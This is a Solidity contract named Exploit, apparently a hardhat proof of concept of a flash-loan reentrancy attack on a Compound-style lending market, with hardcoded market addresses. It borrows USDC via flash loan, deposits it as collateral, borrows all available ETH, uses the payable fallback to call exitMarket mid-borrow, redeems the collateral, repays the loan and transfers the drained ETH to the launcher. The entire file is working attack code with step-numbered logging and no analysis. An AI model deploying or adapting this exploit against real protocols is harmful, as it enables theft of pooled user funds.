pragma solidity ^0.5.16;

import "./interfaces/IERC20.sol";
import "./Vault.sol";
import "./interfaces/IFlashLoanRecipient.sol";
import "./CEther.sol";
import "./CErc20.sol";
import "./Comptroller.sol";
import "./WETH.sol";

import "hardhat/console.sol";

contract Exploit is IFlashLoanRecipient {
    address payable public launcher;
    CEther public cEth = CEther(0x26267e41CeCa7C8E0f143554Af707336f27Fa051);
    CErc20 public cToken = CErc20(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47);
    Comptroller public troll;
    Vault public vault;
    constructor(
        address payable _launcher,
        Comptroller _troll,
        Vault _vault
    ) public {
        console.log(" [Exploit] (1) Deploy exploit contract");
        launcher = _launcher;
        troll = _troll;
        vault = _vault;
    }

	function receiveFlashLoan(
        IERC20[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external {
        console.log(" [Exploit] (3) Enter cUSDC market");
        address[] memory _cTokens = new address[](1);
        _cTokens[0] = address(cToken);
        troll.enterMarkets(_cTokens);
        
        console.log(" [Exploit] (4) Deposit USDC");
        tokens[0].approve(address(cToken), uint256(-1));
        cToken.mint(tokens[0].balanceOf(address(this)));
        (uint _error, uint _liquidity, uint _shortfall) = troll.getAccountLiquidity(address(this));
        console.log(" [Exploit]     cUSDC: %s", cToken.balanceOf(address(this)));
        console.log(" [Exploit]     Liquidity: $%s", _liquidity);
        
        uint _maxAmount = cEth.getCash();
        console.log(" [Exploit] (5) Borrow ETH");
        cEth.borrow(_maxAmount);
        
        console.log(" [Exploit] (7) Redeem USDC");
        cToken.redeemUnderlying(amounts[0]);
        console.log(" [Exploit]     ETH: %s", address(this).balance);
        console.log(" [Exploit]     USDC: %s", tokens[0].balanceOf(address(this)));
        
        console.log(" [Exploit] (8) Pay flash loan");
        tokens[0].transfer(address(vault), amounts[0] + feeAmounts[0]);

        console.log(" [Exploit] (9) Move out %s ETH", address(this).balance);
        launcher.transfer(address(this).balance);
    }

    function() external payable {
        console.log(" [Exploit] (6) Fallback into exitMarket");
        troll.exitMarket(address(cToken));
    }
}